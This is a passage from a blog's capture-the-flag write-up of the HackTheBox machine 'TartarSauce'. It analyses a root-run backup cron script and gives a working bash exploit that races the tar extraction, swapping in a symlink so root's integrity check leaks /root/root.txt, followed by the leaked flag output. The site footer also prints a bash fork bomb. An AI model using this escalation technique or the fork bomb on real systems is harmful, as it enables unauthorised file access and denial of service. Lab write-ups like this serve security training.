<span class="c"># Added a test file to let us see when the last backup was run</span>
/usr/bin/printf <span class="s2">$"</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">Auto backup backuperer backup last ran at : </span><span class="si">$(</span>/bin/date<span class="si">)</span><span class="se">\n</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="nv">$testmsg</span>
<span class="c"># Cleanup from last time.</span>
/bin/rm <span class="nt">-rf</span> <span class="nv">$tmpdir</span>/.<span class="k">*</span> <span class="nv">$check</span>
<span class="c"># Backup onuma website dev files.</span>
/usr/bin/sudo <span class="nt">-u</span> onuma /bin/tar <span class="nt">-zcvf</span> <span class="nv">$tmpfile</span> <span class="nv">$basedir</span> &amp;
<span class="c"># Added delay to wait for backup to complete if large files get added.</span>
/bin/sleep 30
<span class="c"># Test the backup integrity</span>
integrity_chk<span class="o">()</span>
    /usr/bin/diff <span class="nt">-r</span> <span class="nv">$basedir</span> <span class="nv">$check$basedir</span>
/bin/mkdir <span class="nv">$check</span>
/bin/tar <span class="nt">-zxvf</span> <span class="nv">$tmpfile</span> <span class="nt">-C</span> <span class="nv">$check</span>
<span class="k">if</span> <span class="o">[[</span> <span class="si">$(</span>integrity_chk<span class="si">)</span> <span class="o">]]</span>
<span class="k">then</span>
    <span class="c"># Report errors so the dev can investigate the issue.</span>
    /usr/bin/printf <span class="s2">$"</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">Integrity Check Error in backup last ran :  </span><span class="si">$(</span>/bin/date<span class="si">)</span><span class="se">\n</span><span class="nv">$bdr</span><span class="se">\n</span><span class="nv">$tmpfile</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
    integrity_chk <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
    <span class="nb">exit </span>2
<span class="k">else</span>
    <span class="c"># Clean up and save archive to the bkpdir.</span>
    /bin/mv <span class="nv">$tmpfile</span> <span class="nv">$bkpdir</span>/onuma-www-dev.bak
    /bin/rm <span class="nt">-rf</span> <span class="nv">$check</span> .<span class="k">*</span>
    <span class="nb">exit </span>0
</pre></table></code></div></div><p>This just takes 100 characters from <code class="language-plaintext highlighter-rouge">/dev/urandom</code> and creates .<code class="language-plaintext highlighter-rouge">sha1sum</code> named hidden file in <code class="language-plaintext highlighter-rouge">/var/tmp</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">tmpfile</span><span class="o">=</span><span class="nv">$tmpdir</span>/.<span class="si">$(</span>/usr/bin/head <span class="nt">-c100</span> /dev/urandom |sha1sum|cut <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span><span class="si">)</span>
</pre></table></code></div></div><p>I’ll treat it as <code class="language-plaintext highlighter-rouge">/var/tmp/.xxxxxxxxxxxxxxx</code> from now on.</p><ol><li>Remove all previous hidden files in <code class="language-plaintext highlighter-rouge">/var/tmp</code> and <code class="language-plaintext highlighter-rouge">/var/tmp/check</code><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/bin/rm <span class="nt">-rf</span> /var/tmp/.<span class="k">*</span> /var/tmp/check
</pre></table></code></div></div></li><li>Create <code class="language-plaintext highlighter-rouge">gzip</code> file of directory <code class="language-plaintext highlighter-rouge">/var/www/html</code> as onuma at <code class="language-plaintext highlighter-rouge">/var/tmp/.xxxxxxxxxxxx</code>, then sleep for 30 seconds.<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>/usr/bin/sudo <span class="nt">-u</span> onuma /bin/tar <span class="nt">-zcvf</span> /var/tmp/.xxxxxxxxxxxxxxxx /var/www/html &amp;
/bin/sleep 30
</pre></table></code></div></div></li><li>Create directory <code class="language-plaintext highlighter-rouge">/var/tmp/check</code>, decompress that hidden gzip file to <code class="language-plaintext highlighter-rouge">/var/tmp/check</code><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>/bin/mkdir /var/tmp/check
/bin/tar <span class="nt">-zxvf</span> /var/tmp/.xxxxxxxxxxxxxxxx <span class="nt">-C</span> /var/tmp/check
</pre></table></code></div></div></li><li>Defined a <code class="language-plaintext highlighter-rouge">integrity_chk()</code> function which recursively diffs <code class="language-plaintext highlighter-rouge">/var/www/html</code> and <code class="language-plaintext highlighter-rouge">/var/tmp/var/www/html</code><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>integrity_chk<span class="o">()</span>
 /usr/bin/diff <span class="nt">-r</span> /var/www/html /var/tmp/var/www/html
</pre></table></code></div></div></li><li>If <code class="language-plaintext highlighter-rouge">diff</code> fails to checks as both directories being same i.e. result is <code class="language-plaintext highlighter-rouge">false</code>: send errors to <code class="language-plaintext highlighter-rouge">/var/backups/onuma_backup_error.txt</code> else: (<code class="language-plaintext highlighter-rouge">diff</code> runs to smoothly as both directories are same i.e. result is <code class="language-plaintext highlighter-rouge">true</code>) <code class="language-plaintext highlighter-rouge">/bin/mv /var/tmp/.xxxxxxxxxxxx /var/backups/onuma-www-dev.bak</code> and <code class="language-plaintext highlighter-rouge">/bin/rm -rf /var/tmp/check .*</code><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="o">[[</span> <span class="si">$(</span>integrity_chk<span class="si">)</span> <span class="o">]]</span>
<span class="k">then</span>
 /usr/bin/printf <span class="s2">$"</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">Integrity Check Error in backup last ran :  </span><span class="si">$(</span>/bin/date<span class="si">)</span><span class="se">\n</span><span class="nv">$bdr</span><span class="se">\n</span><span class="nv">$tmpfile</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
 integrity_chk <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
 <span class="nb">exit </span>2
<span class="k">else</span>
 /bin/mv <span class="nv">$tmpfile</span> <span class="nv">$bkpdir</span>/onuma-www-dev.bak
 /bin/rm <span class="nt">-rf</span> <span class="nv">$check</span> .<span class="k">*</span>
 <span class="nb">exit </span>0
</pre></table></code></div></div></li></ol><p>Most vulnerable line here is <code class="language-plaintext highlighter-rouge">/bin/tar -zxvf /var/tmp/.xxxx -C /var/tmp/check</code> and not any other. Here’s why:</p><ul><li>2nd point creates a gzip file <code class="language-plaintext highlighter-rouge">/usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.xxx /var/www/html</code> but with user onuma.</li><li>When <code class="language-plaintext highlighter-rouge">/bin/tar -zxvf /var/tmp/.xxxx -C /var/tmp/check</code> is run by root it decompresses the <code class="language-plaintext highlighter-rouge">gzip</code> created by onuma.</li><li>Creating a <code class="language-plaintext highlighter-rouge">symlink</code> of <code class="language-plaintext highlighter-rouge">gzip</code> file to root flag won’t work since, <code class="language-plaintext highlighter-rouge">onuma</code> created the <code class="language-plaintext highlighter-rouge">gzip</code> file and has no perms on reading files owned by root. Secondly, even if root would’ve created the zip, the file wouldn’t resolve and would’ve still be a symlink.</li><li>The only way the way the symlink will be resolved will by compressing directory or decompressing it. Former done by onuma, latter by root.</li></ul><p>Here’s what to do:</p><ul><li>Once the gzip is created at <code class="language-plaintext highlighter-rouge">/var/tmp/</code>, Unzip</li><li>Change the contents inside the gzip, make any file symlink to <code class="language-plaintext highlighter-rouge">/root/root.txt</code></li><li>Zip it again I need to do all of this in 30 seconds, which is the sleep time. Then once the file is unzipped by root, the symlink will be resolved. And since the zips no longer matches the original one, all the <code class="language-plaintext highlighter-rouge">diff</code> is put onto <code class="language-plaintext highlighter-rouge">/var/backups/onuma_backup_error.txt</code></li></ul><p>I made this script for the exploit:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="k">while </span><span class="nb">true</span><span class="p">;</span>
<span class="k">do
</span><span class="nv">tempdir</span><span class="o">=</span>/dev/shm/temp
<span class="nv">file</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> /var/tmp/.<span class="k">*</span> | <span class="nb">awk</span> <span class="s1">'{print $3}'</span><span class="si">)</span>

<span class="nb">echo</span> <span class="nt">---</span> File found <span class="nv">$file</span>

<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="nv">$tempdir</span>
<span class="nb">echo</span> <span class="nt">---</span> Directory created <span class="nv">$tempdir</span>

<span class="nb">echo</span> <span class="nt">---</span> Extracting <span class="nv">$file</span>
<span class="nb">tar</span> <span class="nt">-zxf</span> <span class="nv">$file</span> <span class="nt">-C</span> <span class="nv">$tempdir</span>

<span class="nb">echo</span> <span class="nt">---</span> Removing <span class="nv">$tempdir</span>/var/www/html/robots.txt
<span class="nb">rm</span> <span class="nv">$tempdir</span>/var/www/html/robots.txt

<span class="nb">echo</span> <span class="nt">---</span> Symlink added
<span class="nb">ln</span> <span class="nt">-s</span> /root/root.txt <span class="nv">$tempdir</span>/var/www/html/robots.txt
<span class="nb">ls</span> <span class="nt">-l</span> <span class="nv">$tempdir</span>/var/www/html/robots.txt

<span class="nb">echo</span> <span class="nt">---</span> Removing <span class="nb">gzip</span> <span class="nv">$file</span>
<span class="nb">rm</span> <span class="nv">$file</span>

<span class="nb">echo</span> <span class="nt">---</span> Creating <span class="nb">gzip</span> <span class="nv">$file</span> 
<span class="nb">cd</span> <span class="nv">$tempdir</span>
<span class="nb">tar</span> <span class="nt">-zcf</span> <span class="nv">$file</span> var

<span class="nb">sleep </span>15
<span class="k">done</span>
</pre></table></code></div></div><p>Point to note in this script is, <code class="language-plaintext highlighter-rouge">cd $tempdir</code>. Suppose, If I create the new gzip from remote path like <code class="language-plaintext highlighter-rouge">/tmp</code>, if my directories to zip lies at <code class="language-plaintext highlighter-rouge">/dev/shm/temp/var</code>, the gzip created will have the structure as dev-&gt;shm-&gt;temp-&gt;var-&gt;www-&gt;html. But I want the structure as var-&gt;www-&gt;html. So, I need to have var directory at PWD. That’s why <code class="language-plaintext highlighter-rouge">tar -zcf $file var</code> works and <code class="language-plaintext highlighter-rouge">tar -zcf $file /dev/shm/temp/var</code> doesn’t.</p><p>And after all this runs, the new <code class="language-plaintext highlighter-rouge">gzip</code> when decompressed by root at <code class="language-plaintext highlighter-rouge">/var/tmp/check</code> and <code class="language-plaintext highlighter-rouge">diffed</code> with <code class="language-plaintext highlighter-rouge">/var/www/html</code> will not match. All differences are passed to <code class="language-plaintext highlighter-rouge">/var/backups/onuma_backup_error.txt</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nt">------------------------------------------------------------------------</span>
Integrity Check Error <span class="k">in </span>backup last ran :  Tue Aug 10 01:24:14 EDT 2021
<span class="nt">------------------------------------------------------------------------</span>
/var/tmp/.7f87bdbd08c8ff35760600b1dfc84c370ee93601
diff <span class="nt">-r</span> /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
1,7c1
&lt; User-agent: <span class="k">*</span>
&lt; Disallow: /webservices/tar/tar/source/
&lt; Disallow: /webservices/monstra-3.0.4/
&lt; Disallow: /webservices/easy-file-uploader/
&lt; Disallow: /webservices/developmental/
&lt; Disallow: /webservices/phpmyadmin/
&lt;
<span class="nt">---</span>
<span class="o">&gt;</span> e79abdab8b8a4b64f8579a10b2cd09f9
</pre></table></code></div></div><p>And that’s the root flag.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/linux-machines/'>Linux Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/wordpress-plugin/" class="post-tag no-text-decoration" >wordpress-plugin</a> <a href="/tags/rfi/" class="post-tag no-text-decoration" >rfi</a> <a href="/tags/tar/" class="post-tag no-text-decoration" >tar</a> <a href="/tags/mysql/" class="post-tag no-text-decoration" >mysql</a> <a href="/tags/cronjob/" class="post-tag no-text-decoration" >cronjob</a> <a href="/tags/symlink/" class="post-tag no-text-decoration" >symlink</a> <a href="/tags/race-condition/" class="post-tag no-text-decoration" >race-condition</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TartarSauce - TheCaretaker&url=https://0xcaretaker.github.io/posts/TartarSauce/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TartarSauce - TheCaretaker&u=https://0xcaretaker.github.io/posts/TartarSauce/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=TartarSauce - TheCaretaker&url=https://0xcaretaker.github.io/posts/TartarSauce/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Vault/">Vault</a></li><li><a href="/posts/Knife/">Knife</a></li><li><a href="/posts/Ypuffy/">Ypuffy</a></li><li><a href="/posts/Giddy/">Giddy</a></li><li><a href="/posts/Love/">Love</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a> <a class="post-tag" href="/tags/sql-injection/">sql injection</a> <a class="post-tag" href="/tags/return-to-libc/">return to libc</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/pivoting/">pivoting</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Stratosphere/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 5, 2021 <i class="unloaded">2021-08-05T16:05:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Stratosphere</h3><div class="text-muted small"><p> Stratosphere is a pretty cool box with an Apache Struts vulnerability in which endpoints ending with .action, .go, .do can be injected with a specially crafted Content-Header leading to Remote code...</p></div></div></a></div><div class="card"> <a href="/posts/Armageddon/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jul 24, 2021 <i class="unloaded">2021-07-24T21:37:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Armageddon</h3><div class="text-muted small"><p> Masscan + Nmap $ masscan -p1-65535,U:1-65535 10.10.10.233 --rate=10000 -e tun0 | tee masscan.out Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2021-07-03 11:03:35 GMT -- forced options: -sS -...</p></div></div></a></div><div class="card"> <a href="/posts/Olympus/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 6, 2021 <i class="unloaded">2021-08-06T13:30:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Olympus</h3><div class="text-muted small"><p> Olympus is CTF-like box. Starting with exploting X-Debug plugin in Apache with just HTTP Headers which gives you a container shell. You pivot to other containers while exploring techniques like 802...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Olympus/" class="btn btn-outline-primary"><p>Olympus</p></a> <a href="/posts/Love/" class="btn btn-outline-primary"><p>Love</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="thecaretaker" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> <br> <br> © 2022 <a href="https://twitter.com/0xCaretaker">Deepak Dhasmana</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <br> <script src="https://www.hackthebox.eu/badge/371479"></script></p></div><div class="footer-right"><p class="mb-0"><h4>:(){ :|: &amp; }; :</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a> <a class="post-tag" href="/tags/sql-injection/">sql injection</a> <a class="post-tag" href="/tags/return-to-libc/">return to libc</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/pivoting/">pivoting</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xcaretaker.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
